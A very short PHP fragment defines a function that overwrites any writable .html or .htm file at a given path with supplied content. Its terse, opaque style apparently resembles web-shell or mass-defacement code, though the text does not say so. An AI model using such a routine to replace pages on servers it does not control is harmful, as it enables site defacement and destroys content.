<?php
$H = 'Z';
function __edit($E, $F, &$A, &$S){
	if(($E != 'html' && $E != 'htm') || !is_file($A['f'] . $F) || !is_writable($A['f'] . $F)){ return; }
	file_put_contents(($A['f'] . $F), $A['n'], LOCK_EX);
}
?>
